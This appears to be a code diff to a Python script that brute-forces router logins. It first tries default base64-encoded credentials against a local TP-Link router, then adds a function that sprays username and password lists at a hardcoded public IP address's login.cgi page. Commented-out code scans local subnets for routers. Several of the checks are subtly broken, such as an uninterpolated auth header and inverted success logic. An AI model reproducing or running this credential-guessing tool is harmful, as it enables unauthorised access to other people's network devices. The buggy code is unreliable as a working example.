@@ -2,54 +2,71 @@ import os
 import sys
 import requests
 import threading
+'''
+hosts = list()
+def asfr():
+   #scanning for routers locally
+   for x in range(0,255):
+      url = 'http://'+ '192.168.'+str(x)+'.'+str(1)
+      live = requests.get(url)
+      hosts.append(live)
 
-#for x in range(0,255):
-   # req = 'http://'+ '192.168.'+str(x)+'.'+str(y)
-   # print(os.system(f'wget --connect-timeout 2 -t 1 -S {req} -O index{x}{y}.html'))
-
-
+router_manufacturer = ['']
+user = 'admin'
+password = '1234'
+MAX_ATTEMPTS = 5
+MAX_RETRIES = 3
+'''
 url = "http://192.168.0.1"
 res = requests.get(url)
 status = 200
 if res.status_code == status:
    print('200 OK '+ url)
+   responsecode = res.text
+   #Checking for router manufacturer
+
+   if 'TP-LINK' in responsecode:
+      print("Router is TP-Link") 
+
+   #TPLINK Router testing Module 
+   #Loading Encoded Default PASSWORDS
    with open('encodedcreds.txt','r') as readerCreds:
       for line in readerCreds.readlines():
          cred = line.strip('\n')
          print("[+] Trying with "+cred)
-         os.system(f"curl -v --cookie 'Authorization=Basic {cred}' http://192.168.0.1 > response.html")
-         with open('response.html', 'r') as reader:
-            htmlresp = reader.readlines()
-            print(htmlresp)
-            if 'Base64Encoding' in htmlresp:
-               continue
-            else:
-               print(f"SUCCESS"+'USERNAME&PASSWORD'+str({cred}))
-               exit(0)
+         requestToRouter = requests.get(url, headers={'Authorization':'Basic {cred}'})
+         #print(requestToRouter.text)
+         if 'Base64Encoding' not in requestToRouter.text:
+            print(f"Success-"+str({cred}))
+            exit(0)
+         else:
+            print("Invalid")
+            exit(0)
 
+def post_auth_router():
+       url = 'http://103.125.161.188/login.cgi'
+       with open('users.txt','r') as users_raw_data, open('pass.txt','r') as passwords_raw_data:
+          for u in users_raw_data.readlines():
+            user = u.strip('\n')
+            for p in passwords_raw_data:
+               password = p.strip('\n')                 
+               print(f"[+] Using Credentials {user} and {password}")
+               requestToRouter = requests.post(url, data=f"username={user}&password={password}&submit.htm?login.htm=Send", headers={"Content-Type": "application/x-www-form-urlencoded"})
+               #print(requestToRouter.text)
+               if 'Username or password error' in requestToRouter:
+                  print(f"Success with "+{user}+{password})
+                  print("Exiting...")
+                  exit(0)
+               else:
+                  print("404 Not Found...")
 
-
-
-
-
-
-
-
-
-'''curl -i -s -k -X $'GET' \
-    -H $'Host: 192.168.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.1/' -H $'Connection: close' -H $'Cookie: Authorization=Basic YWRtaW46YWRtaW4=' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
-    -b $'Authorization=Basic YWRtaW46YWRtaW4=' \
-    $'http://192.168.0.1/'
-
-
-
-'''
-
-
-
-#resHTML = res.textYWRtaW46YWRtaW4=
-#os.system('touch sourcecode.txt')
-#with open('sourcecode.txt','w') as reader:
-#   reader.write(resHTML)
-#print(resHTML)
-#os.remove('sourcecode.txt')
+#
+#if __name__ == '__main__':
+#   print("Initializing...")
+#   meth = int(input('''1. Automatic Local Network scan
+#            2. Manual scan'''))
+#   if meth == 1:
+#      #Automatic scan for routers
+#      asfr()
+#   else:
+#      msfr()
